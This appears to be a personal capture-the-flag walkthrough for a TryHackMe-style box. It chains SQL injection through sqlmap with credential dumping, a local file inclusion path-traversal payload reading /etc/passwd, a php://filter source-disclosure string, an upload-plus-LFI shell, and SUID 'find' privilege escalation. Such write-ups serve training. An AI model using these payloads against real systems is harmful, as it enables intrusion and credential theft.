10.10.223.51

FTP server allows anon login - seems empty

web server on 1337
empty index

fuzzing directories finds a couple :

admin
javascript
phpmyadmin
server-status
admin_101

/admin 
is a login page and displays
displays 'Is this the right admin portal?'

/admin_101
is the same login page but has an email already in login field
hacker@root.thm

attempting to login shows something weird in the browser console, it shows a sql command with the email inputted


messages: Array [ "SELECT * FROM user WHERE email = 'test'" ]

possibly try and break out of this?

using SQLMap we are able to preform a MYSQL injection on the target.

a bit of help using this guide: 

https://medium.com/@christophelimpalair/bypass-admin-login-with-sql-injections-sqlmap-bb60d447a1e2

the back-end DBMS is MySQL

we can then dump the data using sqlmap and get the password to 

hacker@root.thm : VeryDifficultPassword!!#@#@!#!@#1231

which gets us to a weird page on chat.php

seems like a deadend


looking at other things dumped by sqlmap we also see:

/file1010111/index.php | 69c66901194a6486176e81f5945b8929

and 

/upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z 

69c66901194a6486176e81f5945b8929 is an md5 hash and can be cracked on crackstation and results in 

easytohack

on /file1010111/index.php we get a hint to fuzz for hidden parameters..

(https://www.infosecinstitute.com/resources/penetration-testing/web-services-penetration-testing-part-6-fuzzing-parameters-burp/)

guide to using burp to fuzz params...

running an attack through burp suite suggests file is a parameter....

send the result of the attack to the repeater and lets try and get some details!!

lets test for file ../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash

ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

this leads to the next page (/upload-cv00101011/index.php) which requires a username starting with Z. Checking the /etc/passwd file we see that there is a user with the name 'zeamkish' lets try this

it works!!

we can upload files, however there is a little javascript checking to see if it is a jpg or png file.

function validate(){

 var fileInput = document.getElementById('file');
  var file = fileInput.files[0];
  
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
  }
}

lets try and bypass this

but first lets get the upload directory. it suggests its in the php source , we cant just view the php source code by inspecting the page but what we can do is leverage the previous LFI vulneralbility and use a php filter to encode the page code into b64 

php://filter/convert.base64-encode/resource=../upload-cv00101011/index.php

and then decoding the b64 gives us the source code

$targetDir = "upload_thm_1001/"; // Directory where uploaded files will be stored

lets test some files... 

FILE BYPASS IS NOT REQUIRED!! even if the actul file ending is .png, using the previous LFI executes the uploded shell!!

we can use this to give us a shell

going to the home directory /home/zeamish has some ssh creds lol

logging into zeamkish gets us the first flag

running linpeas...

'find' has an SUID bit, elevating us to root through gtfobins